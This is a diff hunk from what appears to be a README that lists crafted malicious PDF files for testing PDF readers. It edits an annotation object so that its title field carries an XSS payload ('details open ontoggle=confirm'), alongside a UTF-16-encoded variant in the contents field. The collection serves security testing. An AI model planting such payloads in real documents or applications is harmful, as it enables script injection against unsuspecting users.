@@ -20,7 +20,7 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 
 **Line 177**. Try to inject Javascript code using annotations.
 ```
-<</Type /Annot /Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126 ] /Subtype /Text /M (D:20210402013803+02'00) /C [1 1 0 ] /Popup 15 0 R /T (��^@L^@u^@i^@g^@i) /P 6 0 R /Contents (��^@"^@>^@'^@>^@<^@d^@e^@t^@a^@i^@l^@s^@ ^@o^@p^@e^@n^@ ^@o^@n^@t^@o^@g^@g^@l^@e^@=^@c^@o^@n^@f^@i^@r^@m^@\(^@'^@X^@S^@S^@'^@\)^@>) >>
+<</Type /Annot /Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126 ] /Subtype /Text /M (D:20210402013803+02'00) /C [1 1 0 ] /Popup 15 0 R /T (\">'><details open ontoggle=confirm\(3\)>) /P 6 0 R /Contents (��^@"^@>^@'^@>^@<^@d^@e^@t^@a^@i^@l^@s^@ ^@o^@p^@e^@n^@ ^@o^@n^@t^@o^@g^@g^@l^@e^@=^@c^@o^@n^@f^@i^@r^@m^@\(^@'^@X^@S^@S^@'^@\)^@>) >>
 ```
 
 ### payload2.pdf
